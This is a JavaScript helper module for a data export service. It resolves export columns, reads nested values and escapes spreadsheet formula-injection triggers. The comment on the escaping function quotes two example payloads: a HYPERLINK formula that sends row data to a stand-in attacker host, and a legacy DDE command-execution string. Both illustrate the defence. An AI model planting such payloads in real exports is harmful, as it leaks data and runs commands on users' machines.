'use strict';

/**
 * format-helpers.js — extracted from services/importExportPro.service.js (W278e).
 *
 * Pure helpers used by every exporter to (a) decide which columns to
 * include based on caller-provided fields + system templates + auto-
 * detection from data, (b) read dot-notation nested values from each
 * row. Extracted so formatters can be standalone functions (no class
 * `this`).
 */

const { SYSTEM_TEMPLATES } = require('./system-templates');

/**
 * Resolve columns from fields, data, or system templates
 */
function resolveColumns(data, fields, module) {
  // Use provided fields
  if (fields && fields.length > 0) {
    return fields.map(f => {
      if (typeof f === 'string') {
        const sysField = (SYSTEM_TEMPLATES[module] || []).find(sf => sf.key === f);
        return sysField || { key: f, name: f, nameAr: f, dataType: 'string' };
      }
      return f;
    });
  }

  // Use system template
  if (SYSTEM_TEMPLATES[module]) {
    return SYSTEM_TEMPLATES[module];
  }

  // Auto-detect from data
  if (data.length > 0) {
    const sample = data[0];
    return Object.keys(sample)
      .filter(k => !k.startsWith('_') && k !== '__v')
      .map(key => ({
        key,
        name: key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1'),
        nameAr: key,
        dataType:
          typeof sample[key] === 'number'
            ? 'number'
            : sample[key] instanceof Date
              ? 'date'
              : 'string',
      }));
  }

  return [];
}

/**
 * Get nested object value by dot-separated key
 */
function getNestedValue(obj, key) {
  if (!obj || !key) return undefined;
  return key.split('.').reduce((o, k) => (o && o[k] !== undefined ? o[k] : undefined), obj);
}

/**
 * Defang Excel/Sheets formula triggers in exported strings.
 *
 * A cell whose string value starts with `=`, `+`, `-`, `@`, tab, or
 * CR is interpreted as a formula when the file is opened in Excel,
 * Numbers, LibreOffice Calc, or Google Sheets. An admin who can
 * influence ANY exported field (beneficiary name, payment notes,
 * incident description, etc.) can plant `=HYPERLINK("https://evil/?
 * x="&A1, "click")` to exfiltrate the row to an attacker domain, or
 * the legacy `=cmd|'/C calc'!A0` DDE payload on un-patched Excel.
 *
 * OWASP-recommended defence: prefix any cell starting with one of
 * those characters with a single quote `'`. Excel treats the leading
 * quote as a literal-string marker and displays the rest as text.
 *
 * Numbers, dates, booleans, and null/undefined pass through unchanged.
 * Strings that don't start with a trigger char pass through unchanged.
 */
function escapeFormulaInjection(value) {
  if (typeof value !== 'string' || value.length === 0) return value;
  const first = value.charCodeAt(0);
  // 0x09 = TAB, 0x0D = CR, 0x2B = '+', 0x2D = '-', 0x3D = '=', 0x40 = '@'
  if (
    first === 0x09 ||
    first === 0x0d ||
    first === 0x2b ||
    first === 0x2d ||
    first === 0x3d ||
    first === 0x40
  ) {
    return `'${value}`;
  }
  return value;
}

module.exports = { resolveColumns, getNestedValue, escapeFormulaInjection };
